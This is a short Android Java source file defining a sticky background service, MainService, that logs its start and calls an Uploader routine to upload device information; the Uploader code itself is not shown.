
package com.swago.path;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class MainService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("SwaGoPath", "MainService started");
        Uploader.uploadDeviceInfo(this);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
